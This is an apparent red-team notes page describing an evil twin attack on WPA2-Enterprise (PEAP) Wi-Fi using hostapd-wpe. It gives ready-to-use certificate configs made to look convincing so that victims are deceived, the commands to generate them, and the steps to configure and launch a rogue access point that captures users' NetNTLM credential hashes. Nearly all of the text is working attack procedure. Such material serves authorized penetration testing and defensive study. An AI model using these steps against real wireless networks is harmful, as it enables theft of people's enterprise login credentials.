# WPA/WPA2 PEAP (Enterprise)

In networks with WPA2 PEAP which means Enterprise don't use a pre shared key, the users authenticate with the LDAP credentials. As the router or AP doesn't know if the credentials are correct or not, it delegate to a RADIUS server. The handshake can't not be capture because the authentication is not completed by the server so instead of capturing the handshake we will create a `EvilTwin` but in this case with authentication (Which we are interesting to capture, remember that there are LDAP credentials).

## EvilTwin

To carry out this task, we are going to use `hostapd-wpe` software.

### Configuring Certificates

First we need to aclare that when the user will authenticate to our fake AP, some information about the certificate will be displayed, in order to cheat our v√≠ctims, the certificate will seems as much real as posible.

So we need to modify the following files:

* /etc/hostapd-wpe/certs/server.cnf

```
[server]
countryName             = ES
stateOrProvinceName     = Salamanca
localityName            = Salamanca
organizationName        = Red Team Inc.
emailAddress            = admin@redteam.com
commonName              = "Certificado de Red Team Inc."
```

* /etc/hostapd-wpe/certs/client.cnf

```
[client]
countryName             = ES
stateOrProvinceName     = Salamanca
localityName            = Salamanca
organizationName        = Red Team Inc.
emailAddress            = user@redteam.com
commonName              = user@redteam.com
```

* /etc/hostapd-wpe/certs/ca.cnf

```
[certificate_authority]
countryName             = ES
stateOrProvinceName     = Salamanca
localityName            = Salamanca
organizationName        = Red Team Inc.
emailAddress            = admin@redteam.com
commonName              = "Entidad certificadora de Red Team Inc."
```

Finally, we just need to create it with `bootstrap`.

```
/etc/hostapd-wpe/certs/bootstrap
```

### Configuring te Fake AP

Onced configured and created the certificates, the final step is to configure our FAKE AP. We need to create a backup of the default hostapd config file and modify it.

```
cp /etc/hostapd-wpe/hostapd-wpe.conf /etc/hostapd-wpe/redteam.conf
vim /etc/hostapd-wpe/redteam.conf

#Modify the following values:

interface=<IFACE>
ssid=<ESSID>
channel=<CHANNEL>
```

### Launch & wait for s3crets

Finally, just launch the `hostapd-wpe` indicating the modified configuration file.

```
hostapd-wpe /etc/hostapd-wpe/redteam.conf
```

When the victim falls into our trap, we can obtain their NETLM hash.
